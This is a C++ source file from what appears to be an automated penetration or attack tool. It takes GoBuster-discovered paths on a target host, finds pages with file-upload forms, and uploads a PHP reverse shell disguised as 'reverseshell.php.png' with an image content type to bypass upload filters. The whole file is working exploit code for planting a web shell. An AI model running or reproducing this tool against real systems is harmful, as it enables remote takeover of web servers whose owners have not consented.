#include "../../include/exploit/file_upload.h"
std::vector<std::string> file_upload_page_path;

void FILE_UPLOAD::file_upload_print(std::string message,int COLOR){
	pthread_mutex_lock(lock);
	print (message, COLOR);
	pthread_mutex_unlock(lock);
}
void FILE_UPLOAD::get_data(std::string filename_extension){
	extra_data.clear();
	std::string filename = Reverser_Shell + filename_extension;
	std::stringstream data;
	std::string file_content;
	std::ifstream fin;
	fin.open(filename, std::ios::binary);
	if(!fin.is_open()){
		print("File Not Found Error!!" + filename, 1);
		return;
	}
	data << fin.rdbuf();
	filename = "reverseshell." + filename_extension;
	filename += ".png";
	extra_data += "-----------------------------310808824910080201751194122127\r\nContent-Disposition:form-data; name=\"image\"; filename="+ filename +"\r\nContent-Type: image/png\r\n\r\n";
	extra_data += data.str();
	// [TODO] Checked in pentest lab find out that it is not nececcary to put these fields in post data but "boundary" is important
	extra_data += "\r\n\r\n-----------------------------310808824910080201751194122127\r\nContent-Disposition: form-data; name=\"send\"\r\n\r\nSend file\r\n-----------------------------310808824910080201751194122127--\r\n";
	fin.close();
}

FILE_UPLOAD::FILE_UPLOAD(std::string hostname, int PORT, std::string extra_data, std::string page_path,
						pthread_mutex_t *lock){
	this->hostname = hostname;
	this->PORT = PORT;
	this->extra_data = extra_data;
	this->page_path = page_path;
	this->lock = lock;
}
void FILE_UPLOAD::get_request(){
	print("This is dummmy function haahaa.. !!", 4);
}
void FILE_UPLOAD::post_request(){
	std::string response;
	Sock *file_upload_sock;
	file_upload_sock = new Sock(hostname, PORT);
	get_data("php");
	file_upload_print("file uploading...", 2);
	file_upload_sock->POST_fileupload(page_path, response, extra_data.c_str());
	file_upload_print("file uploaded successfully", 3);
}

void *file_upload_thread(void *thread_data){
	struct thread_data * this_thread_data = (struct thread_data *) thread_data;
	std::vector<std::string> response_vector;
	bool has_file_field, has_input_field;
	int page_method;

	std::string page_add, response, form_action, extra_data = "";
	Sock *file_upload_sock;
	FILE_UPLOAD *file_upload;
	while(1){
		pthread_mutex_lock(&this_thread_data->lock);
		if(file_upload_page_path.empty()){
			print("Done all pages");
			pthread_mutex_unlock(&this_thread_data->lock);
			break;
		}
		page_add = file_upload_page_path.back();
		file_upload_page_path.pop_back();
		pthread_mutex_unlock(&this_thread_data->lock);

		file_upload_sock = new Sock(this_thread_data->hostname,this_thread_data->PORT_NUMBER);
		file_upload_sock->sendrequest(page_add, response);
		has_file_field = false;
		search_for_input_field(response, response_vector, has_input_field, page_method, form_action, has_file_field);
		size_t pop_values = 0 , vector_size = response_vector.size();
		if(vector_size >= 6) pop_values = 4;
			else if(vector_size >= 4) pop_values = 2;
			else if(vector_size >= 2) pop_values = 3;  // I wanted to run loop for once without breaking it so i get this with 3 value only
			if(pop_values){
				for(size_t i = vector_size - 1; i > vector_size - pop_values; i =  i-2){
					extra_data += response_vector[i - 1] + "=" + response_vector[i] + "&";
					response_vector.pop_back();
					response_vector.pop_back();
				}
				extra_data.pop_back();
		}
		if(has_file_field){
			file_upload = new FILE_UPLOAD(this_thread_data->hostname, this_thread_data->PORT_NUMBER, extra_data, page_add, &this_thread_data->lock);
			if(page_method)
				file_upload->post_request();
			else
				file_upload->get_request();
		}
	}
	pthread_exit(NULL);
}

void file_upload(std::string &hostname , int PORT, int THREADS){
	std::string line,filename = Save_LOCATION;
	filename += hostname + FILE_EXTENSION;
	int flag, rc;
	size_t begin;

	file_upload_page_path.clear();
	std::ifstream fin;
	fin.open(filename);

	if(!fin.is_open()){
		print ("host has no file saved or not collected any data from information step ",1);
		return;
	}

	while(std::getline(fin, line)){
			if(line == ">>>> GoBuster Results "){
				flag = 1;
			}
			else if(line == "<<<<" && flag == 1)
					break;
			else if(flag == 1){
				begin = line.find(": ");

				/* Uncomment following two lines for not checking files with 3** html status code*/
	//			status_code = std::atoi(line.substr(begin + 2,1).c_str());
	//			if (status_code == 3) continue;
				begin = line.find(" (");
				line.replace(begin, (int) line.size(), "");
				file_upload_page_path.push_back(line);
			}
		}
	fin.close();
	pthread_t threads[THREADS];
	pthread_mutex_t  lock;
	struct thread_data thread_data[THREADS];

	if(pthread_mutex_init(&lock, NULL)!= 0){
		print("Mutex init failed");
		return;
	}

	for(int i = 0; i < THREADS; i++){
		thread_data[i].thread_id = i;
		thread_data[i].hostname = hostname;
		thread_data[i].lock = lock;
		thread_data[i].PORT_NUMBER = PORT;

		rc = pthread_create(&threads[i], NULL, file_upload_thread,&thread_data[i]);
		if(rc){
			print("Error:unable to create thread "+ std::to_string(rc), 1);
			break;
		}
	}
	print ("Thread Created Attacking ..",4);
	for(int i = 0; i < THREADS; i++)
		pthread_join(threads[i], NULL);

	pthread_mutex_destroy(&lock);
	pthread_exit(NULL);
}

